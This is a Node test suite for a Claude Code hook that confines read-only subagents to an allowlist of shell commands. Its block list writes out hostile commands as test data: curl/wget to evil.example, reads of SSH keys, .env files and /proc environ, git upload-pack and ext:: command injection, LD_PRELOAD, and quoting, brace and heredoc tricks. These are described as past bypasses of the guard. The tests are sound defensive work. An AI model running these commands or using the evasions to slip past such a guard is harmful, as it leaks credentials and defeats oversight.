// Regression tests for .claude/hooks/guard-readonly-bash.mjs.
// Run: node --test .claude/tests/guard-readonly-bash.test.mjs
//
// This file lives under .claude/tests/, not tests/: the P4 eval fixture and the
// docs-site check both leave .claude/ out, and a test that imports the hook would
// be a second failing test in the fixture. It is not under .claude/hooks/ either,
// where the harness grader treats an unregistered file as an orphan. CI runs it
// from the checks lane of verify.yml.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { classifyBashCommand } from "../hooks/guard-readonly-bash.mjs";

const HOOK = join(dirname(fileURLToPath(import.meta.url)), "../hooks/guard-readonly-bash.mjs");
const verdict = (command) => (classifyBashCommand(command).blocked ? "BLOCK" : "allow");

// What a read-only agent needs: the commands its prompt names, and close neighbours.
const ALLOW = [
  // git, read forms
  "git status", "git status --short --branch", "git diff", "git diff --staged", "git diff HEAD~1 -- scripts/measure.mjs",
  "git diff main...HEAD", "git diff --no-ext-diff", "git diff --exit-code", "git log --oneline -5", "git log --all --graph --decorate -20",
  "git log --format=%s -n 3", "git log --pretty=format:%h -S foo", "git log --oneline | head -5", "git show HEAD", "git show HEAD:README.md",
  "git blame scripts/measure.mjs", "git ls-files", "git ls-files | grep test", "git rev-parse HEAD", "git rev-parse --show-toplevel",
  "git branch", "git branch -a", "git branch --show-current", "git tag", "git tag -l 'v*'", "git remote -v", "git remote get-url origin",
  "git config --get user.name", "git config --list", "git stash list", "git stash show -p", "git worktree list", "git reflog",
  "git --no-pager log", "git grep -n foo", "git grep -n foo -- scripts", "git for-each-ref --format='%(refname)'", "git describe --tags",
  "git log --output-indicator-new=+", "git diff --oneline",
  // the gate
  "node --test", 'node --test "tests/*.test.mjs"', "node --test tests/measure.test.mjs", "node design/source/docs-kit/build.mjs --check",
  "node scripts/doc-parity.mjs", "node scripts/measure.mjs --project", "node scripts/measure.mjs /Users/me/.claude/projects/x",
  "node --check scripts/measure.mjs", "node --version", "claude plugin validate --strict .", "claude plugin list", "claude --version",
  "reuse lint", "reuse --version",
  // reading
  "ls", "ls -la", "ls scripts | head", "cat README.md", "head -20 README.md", "tail -n 5 README.md", "wc -l README.md", "stat README.md",
  "grep -rn foo scripts", "grep -rn 'foo' scripts | sort | uniq -c", "grep -rn \"a\\$\" scripts", "grep -n 'x$' README.md", "egrep -c a README.md",
  "rg foo scripts", "rg -n --type js foo", "find . -name '*.mjs'", "find . -type f | sort | uniq -c", "find scripts -newer README.md",
  "sed -n '10,20p' README.md", "sed -n -e '5p' README.md", "sed -n '/foo/p' README.md", "sed -n '$p' README.md", "sort README.md", "sort -u README.md",
  "uniq -c README.md", "cut -d: -f1 README.md", "tr a b", "diff a b", "cmp a b", "column -t README.md", "od -c README.md | head",
  "basename scripts/measure.mjs", "dirname scripts/measure.mjs", "realpath .", "pwd", "which node", "type node", "uname -a", "whoami", "df -h", "du -sh .",
  // shell plumbing
  "echo hi", "echo A=1", "printf '%s\\n' hi", "true", "false", "sleep 1", "seq 1 3", "cd scripts && ls", "cd scripts; cat measure.mjs",
  "test -f README.md && echo yes", "[ -d scripts ] && echo y", "[[ -f README.md ]] && echo y", "ls || echo none", "grep -q foo README.md || true",
  "ls 2>/dev/null", "ls 2>&1", "ls >/dev/null", "echo hi > /dev/null", "ls &>/dev/null", "ls | wc -l", "cat README.md | grep foo | sort | uniq",
  "for f in a b; do cat README.md; done", "if [ -f README.md ]; then cat README.md; fi", "(ls)", "{ ls; }", "ls # a comment", "# only a comment",
  "cat /usr/bin/true", "/bin/ls", "/usr/bin/git status", "echo 'not $(a substitution)'", "echo '`not` a backtick'", 'echo "it\'s fine"', "echo \\$HOME",
  "git diff -- .env.example", "cat .env.example", "ls ~/projects",
  // round 4: what the stricter rules must still let through
  "node --test --test-name-pattern=foo", "node --test --test-reporter=spec", "node --test tests/a.test.mjs tests/b.test.mjs",
  "node --no-warnings scripts/measure.mjs", "node scripts/measure.mjs -p", "node scripts/measure.mjs --project --gate 100",
  "cd scripts", "cd ./scripts", "cd scripts/sub && ls", "printf '%s' hi", "test -f x", "[ -d scripts ]", "[[ -f README.md ]]", "[ -n \"x\" ]",
  "echo {", "echo }", "echo '{a,b}'", 'echo "{a,b}"', "{ ls; }", "cat <<< hi", "cat README.m?", "ls scripts/*.mjs", "wc -l tests/*.test.mjs",
  // (a heredoc is refused outright for a read-only agent: see the block list)
];

// Commands a read-only agent must not run. Every group is a way past an earlier
// version of this guard, or a neighbour of one.
const BLOCK = [
  // shells, wrappers and anything that runs another command
  "sudo ls", "sudo -u root rm x", "sudo -u ls rm x", "doas rm x", "su -c 'rm x'", "env ls", "env", "env FOO=1 ls", "env -S 'rm x'", "env -S 'git status'",
  "env -u FOO rm x", "env -iS'rm x'", "env --split-str='rm x'", "xargs -n 1 rm", "xargs -I{} rm {}", "xargs sh -c 'rm x'", "xargs ls", "git ls-files | xargs rm",
  "command ls", "command -p rm x", "builtin ls", "exec rm x", "eval 'rm x'", "source ./evil.sh", ". ./evil.sh", "time ls", "time -f %e rm x", "timeout 5 ls",
  "timeout 5 rm x", "nice rm x", "nohup rm x", "stdbuf -o0 rm x", "setsid rm x", "ionice rm x", "watch rm x", "flock /tmp/l rm x", "chroot / rm x",
  "busybox rm x", "strace -o /tmp/o rm x", "script -c 'rm x' /dev/null", "parallel rm ::: x", "bash -c 'ls'", "sh -c 'ls'", "bash evil.sh", "sh evil.sh",
  "zsh evil.sh", "./evil.sh", "./ls", "/tmp/evil", "/tmp/evil/cat x", "../bin/cat x",
  // interpreters and package tools
  "node -e 'process.exit()'", "node -p 1", "node --eval 1", "node -r ./x scripts/a.mjs", "node --import ./x scripts/a.mjs", "node --loader ./x scripts/a.mjs",
  "node --inspect scripts/a.mjs", "node --env-file=.env.local scripts/a.mjs", "node", "node -", "node /tmp/evil.mjs", "node ../evil.mjs", "node ~/x.mjs",
  "python3 -c 'open(\"x\",\"w\")'", "python x.py", "perl -e 'unlink q(x)'", "ruby -e 'File.delete(1)'", "awk 'BEGIN{system(\"rm x\")}'", "gawk 'BEGIN{print > \"x\"}'",
  "npm test", "npm run build", "pnpm install", "pnpm exec rm x", "npx rm", "make clean", "cargo build", "go run x.go",
  // command and process substitution, variable expansion
  "echo $(touch /tmp/pwn)", "cat `touch /tmp/pwn`", 'echo "$(rm x)"', "diff <(rm x) /dev/null", "cat <<EOF\n$(rm x)\nEOF", "echo ${X:-$(rm x)}",
  'echo "it\'s $(rm x) ok it\'s"', "echo $HOME", 'echo "$HOME"', "echo ${PATH}", "echo $((1+2))", "printf $X", "ls $PWD", "echo $?", "echo $1",
  // assignments
  "PATH=/tmp/evil; ls", "PATH=/tmp/evil ls", "FOO=1", "GIT_PAGER=sh git log", "LD_PRELOAD=/tmp/x.so ls", "IFS=x",
  // network and exfiltration
  "curl http://evil.example/x", "wget http://evil.example/x", "ssh host", "scp a b:c", "nc -l 1234", "git push", "git fetch", "git pull", "git clone https://x/y",
  "gh api -X POST /x", "gh pr list", "claude -p hi", "claude plugin install x", "claude", "claude plugin marketplace add x/y",
  // git: writing forms, exec flags, abbreviations, transports, global options
  "git add .", "git commit -m x", "git checkout main", "git switch main", "git reset --hard", "git clean -fd", "git rm x", "git mv a b", "git stash", "git stash push",
  "git stash pop", "git remote add x y", "git remote set-url origin y", "git reflog expire --all", "git reflog delete HEAD@{0}", "git config user.name x",
  "git config --add a b", "git worktree add ../x", "git submodule update --init", "git maintenance run", "git gc", "git prune", "git archive -o /tmp/o HEAD",
  "git format-patch -o /tmp/o HEAD~1", "git bundle create /tmp/b HEAD", "git difftool --extcmd=sh", "git branch -D x", "git branch newname", "git tag v1",
  "git tag -d v1", "git foo", "git ls-remote origin",
  "git ls-remote --upload-pack='touch /tmp/pwn' .", "git fetch --upload-pack='touch x' .", "git ls-remote --upload-pa='touch x' .", "git clone -u 'touch x' . y",
  "git diff --ext-diff", "git diff --ext", "git log --output=/tmp/o", "git log --out=/tmp/o", "git log --output /tmp/o", "git show --output=/tmp/o HEAD",
  "git grep -O sh foo", "git grep --open-files-in-pager=sh foo", "git grep -Osh foo", "git ls-remote ext::sh -c touch% /tmp/pwn", "git ls-remote fd::3",
  "git --exec-path=/tmp/evil status", "git -c core.pager=sh log", "git -c diff.external=sh diff", "git -C /tmp log", "git -p log", "git --paginate log",
  "git --config-env=core.pager=X log", "git --namespace=x log", "git --super-prefix=x log", "git --attr-source=x log", "git --version-x",
  "GIT_EXTERNAL_DIFF=sh git diff", "git --no-pager -c x=y log",
  // tools that write or run through a flag
  "find . -exec sh -c 'rm {}' ;", "find . -execdir rm {} ;", "find . -ok rm {} ;", "find . -fprint /tmp/o", "find . -fls /tmp/o", "find . -delete",
  "rg --pre 'sh -c rm' foo", "rg --pre=sh foo", "rg --hostname-bin sh foo", "sort -o x y", "sort -ro x y", "sort -ox y", "sort --output=x y", "sort --out=x y",
  "sort --compress-program=sh x", "sort --comp=sh x", "uniq in out", "uniq -c in out", "sed -i s/a/b/ f", "sed --in-place s/a/b/ f", "sed -n 'w out' f", "sed 'e' f",
  "sed s/a/b/e f", "sed -n 's/a/b/p' f", "sed -f script f", "sed -n 1p -f x f", "sed", "reuse annotate f", "reuse", "tee x", "dd if=a of=b", "xxd -r in out",
  // redirects and chains
  "echo hi > x", "echo hi >> x", "cat a > b", "ls | tee x", "ls >x", "ls 2>x", "ls &>x", "ls >| x", "ls <>x", "ls >& x", "ls; rm x", "ls && rm x", "ls || rm x",
  "ls & rm x", "ls\nrm x", "(rm x)", "{ rm x; }", "if true; then rm x; fi", "for f in a; do rm $f; done", "for f in a; do rm f; done", "while true; do rm x; done",
  "case x in x) rm x ;; esac", "f() { rm x; }; f", "function f { rm x; }",
  "mkdir d", "rm -rf x", "mv a b", "cp a b", "touch f", "chmod +x f", "ln -s a b", "truncate -s 0 f",
  // secrets
  "cat .env", "cat ./.env", "cat .env.local", "cat .env.production", "cat secrets/key", "cat ./secrets/api", "cat ~/.ssh/id_rsa", "cat id_ed25519", "ls ~/.aws",
  "cat ~/.oci/oci_api_key.pem", "cat key.pem", "cat ~/.npmrc", "cat ~/.netrc", "cat ~/.claude.json", "cat ~/.claude/.credentials.json", "cat /proc/self/environ",
  "cat /proc/1/environ", "git show HEAD:.env", "git show HEAD:secrets/key", "git diff -- .env", "grep foo .env", "grep --file=.env x", "head -1 .env", "diff .env .env.example",
  "cat < .env",
  // quoting that hides the command from a reader
  "c''at x | sh", "echo $'rm'", "$'rm' x", "\"rm\" x", "r\\m x", "echo 'unterminated", "ls \"unterminated",
  // round 4: brace expansion hides a flag from every flag check
  "git diff --ext{,}-diff", "git log --out{put,}=/tmp/o", "git ls-remote --upload-pack{,}='touch x' .", "sort -{o,u} x", "echo {a,b}", "echo x{1..3}",
  "ls {a..c}", "cat .en{v,x}", "ls {a,b}/x", "cat {.env,README.md}", "git diff --{ext,no}-diff",
  // round 5: any unquoted brace that does not open a group is refused, not only the forms recognised
  "echo {a}", "ls {a}", "echo {a}b", "ls a{b", "echo {}x", "git log --{oneline}",
  // round 4: a secrets path behind a glued redirect, a glued flag or a glob
  "cat <.env", "cat 0<.env", "cat <<<.env", "grep -f.env x", "grep --file=.env x", "cat <.env.local", "cat <secrets/key", "sort -T.env x",
  // (globs that need real files to match are in the temp-directory tests below)
  "cat *.pem", "cat /proc/*/environ",
  // round 4: node flags are an allowlist
  "node --test --test-reporter-destination=/tmp/o", "node --test-update-snapshots --test", "node --watch scripts/measure.mjs", "node --inspect-brk scripts/measure.mjs",
  "node --max-old-space-size=1 scripts/measure.mjs", "node --no-deprecation scripts/measure.mjs", "node --require ./x scripts/measure.mjs", "node --experimental-vm-modules scripts/a.mjs",
  "node -- scripts/measure.mjs", "node --test -- tests/a.test.mjs", "node --test --import=./x", "node --test --experimental-test-coverage", "node --stack-size=1 scripts/a.mjs",
  // round 4: builtins that assign a variable or evaluate an expression, and cd
  "printf -v PATH /tmp/evil", "printf -vX x", "test -v x", "[ -v x ]", "[[ -v x ]]", "test -R x", "[[ a == [ab]* ]]", "[ -f a[0] ]", "[[ -v a[0] ]]",
  "cd /", "cd /tmp", "cd ~", "cd", "cd ..", "cd ../x", "cd scripts/../..", "cd -", "cd a b", "cd -P /tmp", "cd /tmp && ls",
  // round 5: git after a cd reads another directory's config
  "cd scripts && git status", "cd sub; git log", "cd scripts\ngit diff",
  // round 5: a heredoc is refused outright. A read-only agent has no use for one, and stripping its
  // body would hide text from every check, so none is parsed.
  "cat <<'EOF'\nrm -rf x and secrets and $(not run)\nEOF", "cat <<EOF\nplain text with secrets\nEOF", "cat <<-EOF\n\ttabbed text\n\tEOF",
  'cat <<"EOF"\n$HOME `x`\nEOF', "cat <<EOF | grep x\nplain\nEOF", "grep foo <<'EOF'\nfoo\nEOF", "cat <<EOF\nline one\nline two\nEOF\nls",
  "cat <<EOF\ncost $5\nEOF", "cat <<EOF\n`id`\nEOF", "cat <<EOF >out\nx\nEOF", "cat <<EOF; rm y\nbody\nEOF", "cat <<EOF\nx\nEOF\nrm y",
  "echo '<<EOF'\nrm x\nEOF", 'echo "<<EOF"\nrm x\nEOF', "echo $((1<<EOF))\nrm x\nEOF", "echo a <<<b\nrm x", "cat <<EOF\n$(rm x)\nEOF",
  "bash <<'EOF'\nls\nEOF", "python3 - <<'EOF'\nprint(1)\nEOF", "node - <<'EOF'\nx\nEOF", "git commit -F - <<'EOF'\nmsg\nEOF",
  // a tab-stripped terminator ends the body, so what follows it is a command again
  "cat <<-EOF\n\ttext\n\tEOF\nrm y",
];

for (const command of ALLOW) {
  test(`allow: ${command}`, () => assert.equal(verdict(command), "allow", classifyBashCommand(command).reason));
}
for (const command of BLOCK) {
  test(`block: ${command.replace(/\n/g, "\\n")}`, () => assert.equal(verdict(command), "BLOCK"));
}

test("every blocked command carries a reason", () => {
  for (const command of BLOCK) {
    const result = classifyBashCommand(command);
    assert.equal(result.blocked, true, command);
    assert.match(result.reason ?? "", /\S/, command);
  }
});

test("an assignment is refused with its own explanation, not as an unknown verb", () => {
  // `PATH=/tmp/evil; ls` would change which program the next segment runs.
  for (const command of ["PATH=/tmp/evil; ls", "PATH=/tmp/evil ls", "FOO=1", "GIT_PAGER=sh git log"]) {
    assert.match(classifyBashCommand(command).reason ?? "", /shell variable/, command);
  }
});

test("an empty or non-string command is not blocked", () => {
  assert.equal(classifyBashCommand("").blocked, false);
  assert.equal(classifyBashCommand("   ").blocked, false);
  assert.equal(classifyBashCommand(undefined).blocked, false);
});

// Who the guard covers: the agents defined in .claude/agents/, and only them.
const run = (payload) =>
  spawnSync("node", [HOOK], { input: JSON.stringify(payload), encoding: "utf8" }).status;
const bash = (command, extra = {}) => ({ tool_name: "Bash", tool_input: { command }, ...extra });

test("a project read-only agent is held to the allowlist", () => {
  for (const agent of ["code-reviewer", "silent-failure-hunter", "Explore"]) {
    assert.equal(run(bash("git status", { agent_type: agent })), 0, agent);
    assert.equal(run(bash("rm -rf x", { agent_type: agent })), 2, agent);
    assert.equal(run(bash("echo $HOME", { agent_type: agent })), 2, agent);
  }
});

test("the main session and other agents are not restricted", () => {
  assert.equal(run(bash("rm -rf x")), 0, "main session: no agent_type");
  for (const agent of ["general-purpose", "plugin-dev:plugin-validator", "claude-security:patch-generator"]) {
    assert.equal(run(bash("rm -rf x", { agent_type: agent })), 0, agent);
  }
});

test("a malformed payload does not crash the hook into a block", () => {
  for (const input of ["", "not json", "null", "[]", "{}"]) {
    const status = spawnSync("node", [HOOK], { input, encoding: "utf8" }).status;
    assert.equal(status, 0, JSON.stringify(input));
  }
});

// Globs are expanded where the command runs, so what they match decides whether
// they name a secrets path. These need real files.
function withSecretsDir(fn) {
  const dir = mkdtempSync(join(tmpdir(), "guard-glob-"));
  try {
    mkdirSync(join(dir, "secrets"));
    mkdirSync(join(dir, "sub"));
    for (const f of [".env", ".env.local", "id_rsa", "key.pem", "secrets/k", "README.md", "sub/a.mjs"]) {
      writeFileSync(join(dir, f), "x");
    }
    fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("a glob that matches a secrets path is refused where it expands", () => {
  withSecretsDir((cwd) => {
    for (const command of ["cat .e*", "cat .en?", "cat .[e]nv", "cat .env*", "cat .*", "ls *", "cat *.pem", "cat id_*", "cat sec*/k", "cat ./.e*"]) {
      assert.equal(classifyBashCommand(command, { cwd }).blocked, true, command);
    }
    for (const command of ["cat README.md", "cat sub/*.mjs", "ls sub/*", "grep foo README.m?", 'cat "*"', "cat 'sub/*'"]) {
      assert.equal(classifyBashCommand(command, { cwd }).blocked, false, command);
    }
  });
});

test("a glob that matches a file named like an option is refused", () => {
  // `git log *` with a file called `--output=poc` in the directory would run
  // `git log --output=poc`. File names may start with a dash.
  const dir = mkdtempSync(join(tmpdir(), "guard-dash-"));
  try {
    writeFileSync(join(dir, "README.md"), "x");
    assert.equal(classifyBashCommand("git log *", { cwd: dir }).blocked, false, "no dashed name yet");
    writeFileSync(join(dir, "--output=poc"), "x");
    writeFileSync(join(dir, "-n"), "x");
    for (const command of ["git log *", "ls *", "sort *", "cat -- *", "cat -*", "git diff --*"]) {
      assert.equal(classifyBashCommand(command, { cwd: dir }).blocked, true, command);
    }
    assert.match(classifyBashCommand("git log *", { cwd: dir }).reason ?? "", /read as an option/);
    assert.equal(classifyBashCommand("cat README.md", { cwd: dir }).blocked, false, "no glob");
    assert.equal(classifyBashCommand("cat 'README.*'", { cwd: dir }).blocked, false, "a quoted glob is not expanded");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a glob after a cd expands where the cd leads", () => {
  // The root is clean and only sub/ holds a dotenv file, so `.e*` matches nothing where the
  // command starts and `.env` where the shell is after the cd.
  const dir = mkdtempSync(join(tmpdir(), "guard-cd-"));
  try {
    mkdirSync(join(dir, "sub"));
    mkdirSync(join(dir, "clean"));
    writeFileSync(join(dir, "README.md"), "x");
    writeFileSync(join(dir, "sub", ".env"), "x");
    writeFileSync(join(dir, "clean", "a.mjs"), "x");
    assert.equal(classifyBashCommand("cat .e*", { cwd: dir }).blocked, false, "clean root, no cd");
    assert.equal(classifyBashCommand("cd sub && cat .e*", { cwd: dir }).blocked, true);
    assert.equal(classifyBashCommand("cd sub; cat .e*", { cwd: dir }).blocked, true);
    assert.match(classifyBashCommand("cd sub && cat .e*", { cwd: dir }).reason ?? "", /secrets path \(\.env\)/);
    assert.equal(classifyBashCommand("cd clean && cat *", { cwd: dir }).blocked, false, "a clean directory after a cd");
    assert.equal(classifyBashCommand("cd clean && cat a.mjs", { cwd: dir }).blocked, false);
    // a cd the guard cannot follow leaves a later glob unexpandable, and it is refused
    for (const command of ["cd && cat *", "cd ~ && cat *", "cd - && cat *"]) {
      assert.equal(classifyBashCommand(command, { cwd: dir }).blocked, true, command);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a recursive glob is expanded and judged by what it matches", () => {
  const dir = mkdtempSync(join(tmpdir(), "guard-star-"));
  try {
    mkdirSync(join(dir, "sub"));
    mkdirSync(join(dir, "node_modules", "pkg"), { recursive: true });
    writeFileSync(join(dir, "README.md"), "x");
    writeFileSync(join(dir, "sub", "a.mjs"), "x");
    writeFileSync(join(dir, "node_modules", "pkg", ".env"), "x");
    assert.equal(classifyBashCommand("cat **/*.mjs", { cwd: dir }).blocked, false, "no secret matches");
    assert.equal(classifyBashCommand("wc -l **/*.md", { cwd: dir }).blocked, false);
    assert.equal(classifyBashCommand("cat **/.env*", { cwd: dir }).blocked, false, "node_modules is not walked");
    writeFileSync(join(dir, "sub", ".env"), "x");
    assert.equal(classifyBashCommand("cat **/.env*", { cwd: dir }).blocked, true, "a dotenv file under sub/");
    assert.match(classifyBashCommand("cat **/.env*", { cwd: dir }).reason ?? "", /secrets path/);
    assert.equal(classifyBashCommand("cat **/*.mjs", { cwd: dir }).blocked, false, "still allowed");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("the hook expands globs in the payload's cwd, not its own", () => {
  withSecretsDir((cwd) => {
    const payload = (command, dir) => bash(command, { agent_type: "code-reviewer", cwd: dir });
    assert.equal(run(payload("cat .e*", cwd)), 2, "a dotenv file in the payload cwd");
    assert.equal(run(payload("cat .e*", join(cwd, "sub"))), 0, "no match in a clean cwd");
  });
});
